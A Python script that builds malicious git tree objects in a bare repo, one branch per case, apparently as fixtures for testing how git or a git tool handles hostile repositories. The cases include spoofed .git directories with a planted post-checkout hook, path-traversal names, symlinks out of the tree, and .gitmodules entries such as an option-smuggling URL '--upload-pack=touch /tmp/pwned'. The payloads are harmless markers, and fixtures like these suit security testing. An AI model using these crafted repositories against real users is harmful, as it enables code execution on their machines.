# Crafts one malicious tree per case into a bare repo (branch per case) using raw tree objects.
import subprocess, sys
repo = sys.argv[1]
def git(*a, inp=None):
    return subprocess.run(["git", "--git-dir", repo, *a], input=inp, capture_output=True, check=True).stdout.strip()
def blob(data): return git("hash-object", "-w", "--stdin", inp=data).decode()
def tree(entries):  # entries: (mode, name bytes, sha hex)
    raw = b"".join(m.encode() + b" " + n + b"\0" + bytes.fromhex(s) for m, n, s in entries)
    return git("hash-object", "-t", "tree", "--literally", "-w", "--stdin", inp=raw).decode()
def commit(t, msg):
    return git("commit-tree", t, "-m", msg, inp=b"").decode()
f = blob(b"hello\n")
hook = blob(b"#!/bin/sh\necho PWNED > /tmp/pwned\n")
cfg = blob(b"[core]\n\thooksPath = .\n")
dotgit = tree([("100644", b"config", cfg), ("100755", b"post-checkout", hook)])
sub = tree([("100644", b"x", f)])
gm_name = blob(b'[submodule "../../modules/evil"]\n\tpath = m\n\turl = https://github.com/org/m\n')
gm_url = blob(b'[submodule "m"]\n\tpath = m\n\turl = --upload-pack=touch /tmp/pwned\n')
gm_path = blob(b'[submodule "m"]\n\tpath = .git/hooks\n\turl = https://github.com/org/m\n')
link_out = blob(b"/etc")
link_rel = blob(b"../../../../../../tmp")
cases = {
  "dotgit":       [("40000", b".git", dotgit), ("100644", b"f", f)],
  "dotGIT-case":  [("40000", b".GIT", dotgit), ("100644", b"f", f)],
  "ntfs-git-tilde1":   [("40000", b"git~1", dotgit), ("100644", b"f", f)],
  "ntfs-trailing":[("40000", b".git. ", dotgit), ("100644", b"f", f)],
  "hfs-zwnj":     [("40000", ".git‌".encode(), dotgit), ("100644", b"f", f)],
  "dotdot":       [("40000", b"..", sub), ("100644", b"f", f)],
  "dot":          [("40000", b".", sub), ("100644", b"f", f)],
  "slash-in-name":[("100644", b"a/../../x", f)],
  "empty-name":   [("100644", b"", f), ("100644", b"f", f)],
  "dup-entry":    [("120000", b"evil", link_rel), ("40000", b"evil", sub)],
  "symlink-out":  [("100644", b"f", f), ("120000", b"l-abs", link_out), ("120000", b"l-rel", link_rel)],
  "gitmodules-symlink": [("120000", b".gitmodules", link_out), ("100644", b"f", f)],
  "gitattributes-symlink": [("120000", b".gitattributes", link_out), ("100644", b"f", f)],
  "gitmodules-name": [("100644", b".gitmodules", gm_name), ("160000", b"m", f)],
  "gitmodules-url":  [("100644", b".gitmodules", gm_url), ("160000", b"m", f)],
  "gitmodules-path": [("100644", b".gitmodules", gm_path), ("100644", b"f", f)],
}
for name, ents in cases.items():
    ents = sorted(ents, key=lambda e: e[1] + (b"/" if e[0] == "40000" else b""))
    c = commit(tree(ents), name)
    git("update-ref", "refs/heads/" + name, c)
    print(name, c)
